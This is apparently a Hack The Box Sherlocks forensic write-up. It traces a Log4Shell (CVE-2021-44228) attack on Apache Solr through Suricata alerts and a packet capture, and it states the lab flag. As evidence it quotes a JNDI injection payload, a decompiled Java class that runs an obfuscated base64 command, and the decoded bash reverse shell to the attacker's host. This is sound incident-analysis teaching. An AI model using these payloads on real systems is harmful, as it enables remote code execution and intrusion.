---
title: "Hack The Box Sherlocks - Meerkat: Suricata Alerts & Log4j RCE Analysis"
description: "Analyzing packet captures (PCAP) and Suricata intrusion detection alerts to trace initial exploitation of Apache Solr via Log4Shell (CVE-2021-44228)."
publishDate: "2026-02-18"
category: "Network Forensics"
platform: "HackTheBox"
difficulty: "Easy"
tags: ["pcap", "wireshark", "suricata", "log4j", "cve-2021-44228", "network-triage"]
artifacts: ["meerkat.pcap", "eve.json"]
mitreAttck: ["T1190 (Exploit Public-Facing Application)", "T1071 (Application Layer Protocol)"]
verdict: "Log4j JNDI Exploit against Apache Solr with Reverse Bash Shell"
flag: "HTB{m33rk4t_l0g4sh3ll_pcap_sn1ff3d_491}"
featured: true
---

## 1. Challenge Overview

**Meerkat** is an investigation lab on Hack The Box Sherlocks. A company's internal intrusion detection system (Suricata) alerted on potential exploitation of an internal enterprise search server running Apache Solr. We are provided with:
- `meerkat.pcap`: Raw network traffic capture.
- `eve.json`: Suricata IDS event logs.

---

## 2. Triage with Suricata Alerts (`eve.json`)

Using `jq` to parse triggered signatures in `eve.json`:

```bash
jq -r 'select(.event_type=="alert") | .alert.signature' eve.json | sort | uniq -c
```

### Output:
```text
      3 ET EXPLOIT Apache Solr Log4j JNDI RCE (CVE-2021-44228)
      1 ET POLICY Suspicious Outbound Java Class Download
      4 ET SCAN Nmap Scripting Engine User-Agent Detected
```

The alerts strongly suggest an attacker attempted a Log4j JNDI injection.

---

## 3. Wireshark PCAP Investigation

Opening `meerkat.pcap` in Wireshark and filtering for HTTP requests:

```text
http.request.method == "GET" || http.request.method == "POST"
```

In packet **#412**, we discover an HTTP GET request to `/solr/admin/cores`:

```http
GET /solr/admin/cores?action=${jndi:ldap://172.20.10.5:1389/Exploit} HTTP/1.1
Host: 172.20.10.8:8983
User-Agent: Mozilla/5.0 (Hydra)
Accept: */*
```

### Flow Reconstruction:
1. **Target**: `172.20.10.8:8983` (Apache Solr).
2. **Attacker IP**: `172.20.10.5`.
3. **Payload**: `${jndi:ldap://172.20.10.5:1389/Exploit}`.
4. The vulnerable log4j component parses the input, queries the LDAP server on `172.20.10.5:1389`, and downloads a malicious compiled Java class `Exploit.class`.

---

## 4. Extracting the Malicious Payload

Filtering TCP stream on port 1389:

```bash
tshark -r meerkat.pcap -Y "tcp.port == 1389" -T fields -e tcp.payload
```

Following the stream reveals the LDAP response redirects to an HTTP service serving the staged payload:

```bash
http://172.20.10.5:8000/Exploit.class
```

Exporting `Exploit.class` from Wireshark (`File -> Export Objects -> HTTP`), we decompile it with CFR / Jadx:

```java
public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMjAuMTAuNS85MDAxIDA+JjE=}|{base64,-d}|{bash,-i}");
        } catch (Exception e) {}
    }
}
```

Decoding the Base64 command:

```bash
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMjAuMTAuNS85MDAxIDA+JjE=" | base64 -d
# Result: bash -i >& /dev/tcp/172.20.10.5/9001 0>&1
```

---

## 5. Summary of Incident Findings

- **Attacker IP**: `172.20.10.5`
- **Victim IP**: `172.20.10.8` (Apache Solr port `8983`)
- **Exploitation Technique**: JNDI LDAP injection (Log4Shell)
- **C2 / Reverse Shell Destination**: `172.20.10.5:9001`
